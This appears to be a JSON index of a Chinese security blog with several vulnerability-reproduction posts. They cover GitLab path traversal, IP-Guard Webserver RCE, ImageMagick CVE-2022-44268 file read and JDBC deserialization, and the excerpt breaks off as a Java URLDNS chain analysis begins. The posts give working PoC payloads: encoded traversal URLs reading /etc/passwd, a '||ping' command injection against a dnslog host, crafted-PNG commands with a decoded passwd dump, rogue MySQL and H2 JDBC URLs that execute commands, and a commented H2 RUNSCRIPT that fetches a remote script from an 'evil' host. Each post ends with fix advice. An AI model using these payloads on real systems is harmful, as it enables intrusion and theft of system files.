class=\"line\">http://192.168.88.104:8880/gro1/gro2/gro3/gro4/gro5/gro6/gro7/gro8/gro9/gro10/gro11/gro12/gro13/gro14/gro15/sectest/uploads/0fd0306fac2cb12ded8d284efeff2a79/qwe.jpg</span><br></pre></td></tr></table></figure>\n<p><img src=\"EWgjpMXfPgpX4frxhHbSF1cDFQjdU_Bs7I9k9wxVt60.png\" alt=\"image\"></p>\n<h2 id=\"POC利用\"><a href=\"#POC利用\" class=\"headerlink\" title=\"POC利用\"></a>POC利用</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://192.168.88.104:8880/gro1/gro2/gro3/gro4/gro5/gro6/gro7/gro8/gro9/gro10/gro11/gro12/gro13/gro14/gro15/sectest/uploads/0fd0306fac2cb12ded8d284efeff2a79/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</span><br></pre></td></tr></table></figure>\n<p><img src=\"UrYZCtrVFVgJe0nKX8Us8pp9ixYBIsLyjlwTtCJRd9Q.png\" alt=\"image\"></p>\n<h2 id=\"简单分析\"><a href=\"#简单分析\" class=\"headerlink\" title=\"简单分析\"></a>简单分析</h2><p>当用户请求的时候是需要经过以下的流程</p>\n<p>nginx–&gt;Workhorse–&gt;puma</p>\n<p>当nginx处理复杂的URI的时候，只会对URL编码进行部分解码。随后传到Workhorse，转发到puma，由puma去做文件读取。</p>\n<p>在服务器查看存储的附件的位置，大概有10层，我们上述创建的group为15层，符合大于这里的10层的要求。</p>\n<p><img src=\"hjMoXY-sdkJ8JmHHUbOGFU3jwkXu_kunT4ET5GSSs78.png\" alt=\"image\"></p>\n<h2 id=\"利用条件\"><a href=\"#利用条件\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h2><p>存在嵌套group项目；且嵌套的数目大于根目录存储附件的层数，同时需要有issus等</p>\n<h2 id=\"修复建议\"><a href=\"#修复建议\" class=\"headerlink\" title=\"修复建议\"></a>修复建议</h2><p>目前该漏洞已经修复，受影响用户可升级到以下版本：</p>\n<p>GitLab CE&#x2F;EE版本：&gt;&#x3D; 16.0.1</p>\n<p>下载链接：<a href=\"https://about.gitlab.com/update/\">https://about.gitlab.com/update/</a></p>\n","categories":["漏洞复现"],"tags":["漏洞复现"]},{"title":"IP-Guard Webserver RCE","url":"/2023/12/06/IP-Guard%20Webserver%20RCE%20/","content":"<h1 id=\"IP-Guard-Webserver-RCE\"><a href=\"#IP-Guard-Webserver-RCE\" class=\"headerlink\" title=\"IP-Guard Webserver RCE\"></a>IP-Guard Webserver RCE</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>ip-guard是2001年推出的终端安全防泄密软件，拥有七大产品十八大模块，能满足企业数据防泄密、文件加密、局域网电脑管理、上网行为管理、系统运维等需求。近日发现ip-guard Webserver存在远程命令执行漏洞。</p>\n<h2 id=\"fofa指纹\"><a href=\"#fofa指纹\" class=\"headerlink\" title=\"fofa指纹\"></a>fofa指纹</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">fofa：<span class=\"string\">&quot;IP-guard&quot;</span> &amp;&amp; icon_hash=<span class=\"string\">&quot;2030860561&quot;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"复现\"><a href=\"#复现\" class=\"headerlink\" title=\"复现\"></a>复现</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">/ipg/static/appr/lib/flexpaper/php/view.php?doc=66.jpg&amp;format=swf&amp;isSplit=<span class=\"literal\">true</span>&amp;page=||ping xxx.dnslog.cn</span><br></pre></td></tr></table></figure>\n<p><img src=\"hRoOqwozhBzm554G9ax7_jBq02kR3Ytkp2fm7wgCLLE.png\" alt=\"image\"></p>\n<p>dnslog验证成功</p>\n<p><img src=\"9ZnOf4Ebh-RfAF4-ImJVjaTawQQRYMCb2Tt_kkq4_Xk.png\" alt=\"image\"></p>\n<h2 id=\"修复建议\"><a href=\"#修复建议\" class=\"headerlink\" title=\"修复建议\"></a>修复建议</h2><p>官方已修复该漏洞，建议用户更新到安全版本。</p>\n<p>安全版本:IP-guard WebServer &gt;&#x3D; 4.81.0307.0</p>\n<p>下载链接：<a href=\"https://www.ip-guard.net/\">https://www.ip-guard.net/</a></p>\n","categories":["漏洞复现"],"tags":["漏洞复现"]},{"title":"ImageMagick任意文件读取漏洞 (CVE-2022-44268)","url":"/2023/02/22/ImageMagick%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20(CVE-2022-44268)/","content":"<h1 id=\"ImageMagick任意文件读取漏洞-CVE-2022-44268\"><a href=\"#ImageMagick任意文件读取漏洞-CVE-2022-44268\" class=\"headerlink\" title=\"ImageMagick任意文件读取漏洞 (CVE-2022-44268)\"></a>ImageMagick任意文件读取漏洞 (CVE-2022-44268)</h1><h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><p>ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。</p>\n<h2 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">ImageMagick <span class=\"number\">7.1</span>.x &lt;= <span class=\"number\">7.1</span><span class=\"number\">.0</span>-<span class=\"number\">51</span></span><br><span class=\"line\">ImageMagick <span class=\"number\">7.0</span>.x</span><br><span class=\"line\">ImageMagick <span class=\"number\">6.9</span>.x</span><br><span class=\"line\">ImageMagick <span class=\"number\">6.8</span><span class=\"number\">.3</span>-<span class=\"number\">10</span> &lt;= <span class=\"number\">6.8</span>.x &lt;= <span class=\"number\">6.8</span><span class=\"number\">.9</span>-<span class=\"number\">10</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"环境部署\"><a href=\"#环境部署\" class=\"headerlink\" title=\"环境部署\"></a>环境部署</h2><p><strong>imagemagick及其依赖环境安装：</strong></p>\n<p>我这边是直接在centos里面安装了这个环境的，命令如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum -y install ImageMagick pngcrush exiftool exiv2 -y</span><br></pre></td></tr></table></figure>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p><strong>生成恶意图片文件</strong></p>\n<p>可选择任意png文件，使用pngcrush对其进行编辑生成，默认生成文件为pngout.png</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">pngcrush -text a <span class=\"string\">&quot;profile&quot;</span> <span class=\"string\">&quot;/etc/passwd&quot;</span> exp.png</span><br></pre></td></tr></table></figure>\n<p>或者使用脚本</p>\n<p><a href=\"https://codeload.github.com/Sybil-Scan/imagemagick-lfi-poc/zip/refs/heads/main\">https://codeload.github.com/Sybil-Scan/imagemagick-lfi-poc/zip/refs/heads/main</a></p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">python3 generate.py -f &quot;/etc/passwd&quot; -o exploit.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"f-ese1LhLLFdBw0AWb-6gQevjjIFgZ53ahYNuBm1TOg.png\" alt=\"image\"></p>\n<p><strong>验证生成文件</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">exiv2 -pS exp.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"KgELFLLhuDYbM_cg6fs43HuhfrlEQpAgISgDN9JAwO0.png\" alt=\"image\"></p>\n<p><strong>执行convert，调用ImagemMagic对图片进行编辑</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">convert exp.png haha6.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"WcRJPYlNXNNnLRuiCpF-aHgq6jiAzojD1ebbFcAhEIk.png\" alt=\"image\"></p>\n<p><strong>读取生成图片内容</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">identify -verbose haha6.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"Fo-5o5IfS7UrV7zkugPZZw8psf4h0SjVMBw8MqzpzhI.png\" alt=\"image\"></p>\n<p><img src=\"Yu95gJsykkPmi8nbDP6EvI9vQzQJ5y3Ss3MWAaYxgW8.png\" alt=\"image\"></p>\n<p>python解码示例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(bytes.fromhex(text).decode(<span class=\"string\">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(bytes.fromhex(<span class=\"string\">&quot;726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a62696e3a783a313a313a62696e3a2f62696e3a2f7362696e2f6e6f6c6f67696e0a6461656d6f6e3a783a323a323a6461656d6f6e3a2f7362696e3a2f7362696e2f6e6f6c6f67696e0a61646d3a783a333a343a61646d3a2f7661722f61646d3a2f7362696e2f6e6f6c6f67696e0a6c703a783a343a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7362696e2f6e6f6c6f67696e0a73796e633a783a353a303a73796e633a2f7362696e3a2f62696e2f73796e630a73687574646f776e3a783a363a303a73687574646f776e3a2f7362696e3a2f7362696e2f73687574646f776e0a68616c743a783a373a303a68616c743a2f7362696e3a2f7362696e2f68616c740a6d61696c3a783a383a31323a6d61696c3a2f7661722f73706f6f6c2f6d61696c3a2f7362696e2f6e6f6c6f67696e0a6f70657261746f723a783a31313a303a6f70657261746f723a2f726f6f743a2f7362696e2f6e6f6c6f67696e0a67616d65733a783a31323a3130303a67616d65733a2f7573722f67616d65733a2f7362696e2f6e6f6c6f67696e0a6674703a783a31343a35303a46545020557365723a2f7661722f6674703a2f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a39393a39393a4e6f626f64793a2f3a2f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3139323a3139323a73797374656d64204e6574776f726b204d616e6167656d656e743a2f3a2f7362696e2f6e6f6c6f67696e0a646275733a783a38313a38313a53797374656d206d657373616765206275733a2f3a2f7362696e2f6e6f6c6f67696e0a706f6c6b6974643a783a3939393a3939383a5573657220666f7220706f6c6b6974643a2f3a2f7362696e2f6e6f6c6f67696e0a737373643a783a3939383a3939363a5573657220666f7220737373643a2f3a2f7362696e2f6e6f6c6f67696e0a6c696273746f726167656d676d743a783a3939373a3939343a6461656d6f6e206163636f756e7420666f72206c696273746f726167656d676d743a2f7661722f72756e2f6c736d3a2f7362696e2f6e6f6c6f67696e0a7270633a783a33323a33323a52706362696e64204461656d6f6e3a2f7661722f6c69622f72706362696e643a2f7362696e2f6e6f6c6f67696e0a636f6c6f72643a783a3939363a3939333a5573657220666f7220636f6c6f72643a2f7661722f6c69622f636f6c6f72643a2f7362696e2f6e6f6c6f67696e0a676c75737465723a783a3939353a3939323a476c75737465724653206461656d6f6e733a2f7661722f72756e2f676c75737465723a2f7362696e2f6e6f6c6f67696e0a7361736c617574683a783a3939343a37363a5361736c617574686420757365723a2f72756e2f7361736c61757468643a2f7362696e2f6e6f6c6f67696e0a616272743a783a3137333a3137333a3a2f6574632f616272743a2f7362696e2f6e6f6c6f67696e0a736574726f75626c6573686f6f743a783a3939333a3939303a3a2f7661722f6c69622f736574726f75626c6573686f6f743a2f7362696e2f6e6f6c6f67696e0a72746b69743a783a3137323a3137323a5265616c74696d654b69743a2f70726f633a2f7362696e2f6e6f6c6f67696e0a70756c73653a783a3137313a3137313a50756c7365417564696f2053797374656d204461656d6f6e3a2f7661722f72756e2f70756c73653a2f7362696e2f6e6f6c6f67696e0a6368726f6e793a783a3939323a3938373a3a2f7661722f6c69622f6368726f6e793a2f7362696e2f6e6f6c6f67696e0a727063757365723a783a32393a32393a525043205365727669636520557365723a2f7661722f6c69622f6e66733a2f7362696e2f6e6f6c6f67696e0a6e66736e6f626f64793a783a36353533343a36353533343a416e6f6e796d6f7573204e465320557365723a2f7661722f6c69622f6e66733a2f7362696e2f6e6f6c6f67696e0a756e626f756e643a783a3939313a3938363a556e626f756e6420444e53207265736f6c7665723a2f6574632f756e626f756e643a2f7362696e2f6e6f6c6f67696e0a7473733a783a35393a35393a4163636f756e742075736564206279207468652074726f7573657273207061636b61676520746f2073616e64626f78207468652074637364206461656d6f6e3a2f6465762f6e756c6c3a2f7362696e2f6e6f6c6f67696e0a7573626d7578643a783a3131333a3131333a7573626d75786420757365723a2f3a2f7362696e2f6e6f6c6f67696e0a67656f636c75653a783a3939303a3938343a5573657220666f722067656f636c75653a2f7661722f6c69622f67656f636c75653a2f7362696e2f6e6f6c6f67696e0a72616476643a783a37353a37353a726164766420757365723a2f3a2f7362696e2f6e6f6c6f67696e0a71656d753a783a3130373a3130373a71656d7520757365723a2f3a2f7362696e2f6e6f6c6f67696e0a6e74703a783a33383a33383a3a2f6574632f6e74703a2f7362696e2f6e6f6c6f67696e0a67646d3a783a34323a34323a3a2f7661722f6c69622f67646d3a2f7362696e2f6e6f6c6f67696e0a676e6f6d652d696e697469616c2d73657475703a783a3938393a3938333a3a2f72756e2f676e6f6d652d696e697469616c2d73657475702f3a2f7362696e2f6e6f6c6f67696e0a737368643a783a37343a37343a50726976696c6567652d736570617261746564205353483a2f7661722f656d7074792f737368643a2f7362696e2f6e6f6c6f67696e0a61766168693a783a37303a37303a4176616869206d444e532f444e532d534420537461636b3a2f7661722f72756e2f61766168692d6461656d6f6e3a2f7362696e2f6e6f6c6f67696e0a706f73746669783a783a38393a38393a3a2f7661722f73706f6f6c2f706f73746669783a2f7362696e2f6e6f6c6f67696e0a74637064756d703a783a37323a37323a3a2f3a2f7362696e2f6e6f6c6f67696e0a7a68696e616e3a783a313030303a313030303a7a68696e616e3a2f686f6d652f7a68696e616e3a2f62696e2f626173680a73616e65643a783a3938383a3938323a53414e45207363616e6e6572206461656d6f6e20757365723a2f7573722f73686172652f73616e653a2f7362696e2f6e6f6c6f67696e0a&quot;</span>).decode(<span class=\"string\">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>\n<p><img src=\"rI5sRPsJaJJGMz4NZ1bkCQhjmLgjOVMNoYaxIhigNzY.png\" alt=\"image\"></p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>参考：<a href=\"https://www.metabaseq.com/imagemagick-zero-days/\">https://www.metabaseq.com/imagemagick-zero-days/</a> </p>\n<p>这里以ImageMagick-7.1.0-50为例</p>\n<p>下载地址：<a href=\"https://github.com/ImageMagick/ImageMagick/releases?page=3\">https://github.com/ImageMagick/ImageMagick/releases?page=3</a></p>\n<p>读取PNG文件</p>\n<p>coders&#x2F;png.c:2164的ReadOnePNGImage</p>\n<p><img src=\"9sBp92IEFRqxjQ8m6OknRJT_vxiawLYajMeB92lCtOk.png\" alt=\"image\"></p>\n<p>读取tEXt的过程当中会调用到SetImageProperty()</p>\n<p><img src=\"vtNgJlbyW1oTVDyugyLC8XNuQUZRVC52HZ9AlOmfqlM.png\" alt=\"image\"></p>\n<p>SetImageProperty()在于MagickCore&#x2F;property.c:4360</p>\n<p><img src=\"Jqu1VvLsz3Vo8ymIDkDsH_T6gGkHTTWS4b0BHPPQ2O0.png\" alt=\"image\"></p>\n<p>在SetImageProperty()中，如果匹配到profile就进行文件读取，再将其重新赋值。（MagickCore&#x2F;property.c:4723）</p>\n<p><img src=\"WpjfH9aNHmJBSrS9LcAD86GXYzFwOqDfqO2QlYslS0o.png\" alt=\"image\"></p>\n<p>读取成功之后就写入到新的png文件中。攻击者下载该图片，即可获取到内容。</p>\n<p>思路整理：</p>\n<ul>\n<li>攻击者向PNG图片添加的文本块中包含profile“关键字”和“文本字符串”</li>\n<li>ImageMagick把文本字符串做为文件路径去读取文件</li>\n<li>文件内容以HEX形式嵌入新生成的PNG图片</li>\n<li>攻击者下载新的PNG图片</li>\n</ul>\n","categories":["漏洞复现"],"tags":["漏洞复现"]},{"title":"JDBC反序列化漏洞简单利用","url":"/2022/12/15/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/","content":"<h2 id=\"JDBC反序列化漏洞简单利用\"><a href=\"#JDBC反序列化漏洞简单利用\" class=\"headerlink\" title=\"JDBC反序列化漏洞简单利用\"></a>JDBC反序列化漏洞简单利用</h2><p>创建一个maven的项目</p>\n<p>启动一个恶意的MySQL</p>\n<p>python2 rogue_mysql_server.py</p>\n<p><img src=\"Cw3kbcGYMzdsw1laSeevFZeDvm3k0nVaDd5fyxTLOEQ.png\" alt=\"image\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">package poc;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.Connection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.DriverManager;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.SQLException;</span><br><span class=\"line\"></span><br><span class=\"line\">public <span class=\"keyword\">class</span> <span class=\"title class_\">TestJDBC</span> &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws ClassNotFoundException, SQLException &#123;</span><br><span class=\"line\">        Class.forName(<span class=\"string\">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class=\"line\">        String url = <span class=\"string\">&quot;jdbc:mysql://127.0.0.1:3306/mysql?useSSL=false&amp;allowLoadLocalInfile=true&amp;maxAllowedPacket=65535&quot;</span>;</span><br><span class=\"line\">        Connection conn = DriverManager.getConnection(url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"_tspeQii5wXIZ12a3GrKaAeTaBf0iloEPHNmoQJUiV0.png\" alt=\"image\"></p>\n<p>弹计算器1：</p>\n<p>python37 server.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;config&quot;</span>:&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;ysoserialPath&quot;</span>:<span class=\"string\">&quot;ysoserial-0.0.6-SNAPSHOT-all.jar&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;javaBinPath&quot;</span>:<span class=\"string\">&quot;java&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;fileOutputDir&quot;</span>:<span class=\"string\">&quot;./fileOutput/&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;displayFileContentOnScreen&quot;</span>:true,</span><br><span class=\"line\">        <span class=\"string\">&quot;saveToFile&quot;</span>:true</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&quot;fileread&quot;</span>:&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;win_ini&quot;</span>:<span class=\"string\">&quot;c:\\\\windows\\\\win.ini&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;win_hosts&quot;</span>:<span class=\"string\">&quot;c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;win&quot;</span>:<span class=\"string\">&quot;c:\\\\windows\\\\&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;linux_passwd&quot;</span>:<span class=\"string\">&quot;/etc/passwd&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;linux_hosts&quot;</span>:<span class=\"string\">&quot;/etc/hosts&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;index_php&quot;</span>:<span class=\"string\">&quot;index.php&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;ssrf&quot;</span>:<span class=\"string\">&quot;https://www.baidu.com/&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;__defaultFiles&quot;</span>:[<span class=\"string\">&quot;/etc/hosts&quot;</span>,<span class=\"string\">&quot;c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts&quot;</span>]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&quot;yso&quot;</span>:&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;Jdk7u21&quot;</span>:[<span class=\"string\">&quot;Jdk7u21&quot;</span>,<span class=\"string\">&quot;calc&quot;</span>]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>poc</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">package poc;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.Connection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.DriverManager;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.SQLException;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public <span class=\"keyword\">class</span> <span class=\"title class_\">Test2</span> &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws ClassNotFoundException, SQLException &#123;</span><br><span class=\"line\">        Class.forName(<span class=\"string\">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class=\"line\">        String url = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">//        url = <span class=\"string\">&quot;jdbc:mysql://localhost:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;maxAllowedPacket=65535&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;</span> +</span><br><span class=\"line\">//                <span class=\"string\">&quot;&amp;user=yso_URLDNS_http://blqr5c.dnslog.cn/&quot;</span>;</span><br><span class=\"line\">        url = <span class=\"string\">&quot;jdbc:mysql://localhost:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;maxAllowedPacket=65535&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;&amp;user=yso_CommonsCollections6_calc&quot;</span>;</span><br><span class=\"line\">        Connection conn = DriverManager.getConnection(url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"p_ayYGcietaoOPFgPzRUG0EteXMxeuHbtJzbjvnW8Wo.png\" alt=\"image\"></p>\n<p>弹计算器2：</p>\n<p>python37 server.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;config&quot;</span>:&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;ysoserialPath&quot;</span>:<span class=\"string\">&quot;ysoserial-0.0.6-SNAPSHOT-all.jar&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;javaBinPath&quot;</span>:<span class=\"string\">&quot;java&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;fileOutputDir&quot;</span>:<span class=\"string\">&quot;./fileOutput/&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;displayFileContentOnScreen&quot;</span>:true,</span><br><span class=\"line\">        <span class=\"string\">&quot;saveToFile&quot;</span>:true</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&quot;fileread&quot;</span>:&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;win_ini&quot;</span>:<span class=\"string\">&quot;c:\\\\windows\\\\win.ini&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;win_hosts&quot;</span>:<span class=\"string\">&quot;c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;win&quot;</span>:<span class=\"string\">&quot;c:\\\\windows\\\\&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;linux_passwd&quot;</span>:<span class=\"string\">&quot;/etc/passwd&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;linux_hosts&quot;</span>:<span class=\"string\">&quot;/etc/hosts&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;index_php&quot;</span>:<span class=\"string\">&quot;index.php&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;ssrf&quot;</span>:<span class=\"string\">&quot;https://www.baidu.com/&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;__defaultFiles&quot;</span>:[<span class=\"string\">&quot;/etc/hosts&quot;</span>,<span class=\"string\">&quot;c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts&quot;</span>]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&quot;yso&quot;</span>:&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;Jdk7u21&quot;</span>:[<span class=\"string\">&quot;Jdk7u21&quot;</span>,<span class=\"string\">&quot;calc&quot;</span>]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">package poc;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.Connection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.DriverManager;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.SQLException;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public <span class=\"keyword\">class</span> <span class=\"title class_\">test3</span> &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws ClassNotFoundException, SQLException &#123;</span><br><span class=\"line\">        Class.forName(<span class=\"string\">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class=\"line\">        String url = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        url = <span class=\"string\">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\\n&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;$$\\n&quot;</span>;</span><br><span class=\"line\">        //url = <span class=\"string\">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=RUNSCRIPT FROM &#x27;http://evil1.dnslog.ceye.io/h2.sql&#x27;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        Connection conn = DriverManager.getConnection(url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"lXiTGSfzOaN2woWTsJ-Bf4JIVm5dh4WovkQDDOOCO8s.png\" alt=\"image\"></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","反序列化","JDBC"]},{"title":"Java安全之URLDNS链分析","url":"/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/","content":"<h1 id=\"Java安全之URLDNS链分析\"><a href=\"#Java安全之URLDNS链分析\" class=\"headerlink\" title=\"Java安全之URLDNS链分析\"></a>Java安全之URLDNS链分析</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>今天来复习一下URLDNS这条链，水一篇文章吧。也弥补了Java安全系列的入门必学的一个利用链的文章的空白。URLDNS链本身不能执行命令，多用于构造 DNS 操作的 payload，它被广泛用于演示和测试 Java 序列化的安全性问题。</p>\n<h2 id=\"Java反序列化\"><a href=\"#Java反序列化\" class=\"headerlink\" title=\"Java反序列化\"></a>Java反序列化</h2><p>我们先来学一个简单的序列化和反序列化的demo</p>\n<p>这里主要是写了一个可以序列化的Person类，其中包含了两个属性，分别是name和age。</p>\n<p>在主函数中，我们先实例化一个对象person，然后调用serialize将其进行序列化，并且输出为person.bin，紧接着调用deserialize将person.bin文件进行反序列化为一个deserializedPerson对象，然后通过调用get方法的方式获取其属性值进行输出。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.Javasecure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span> Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span> 2023/7/17 11:17 上午</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> 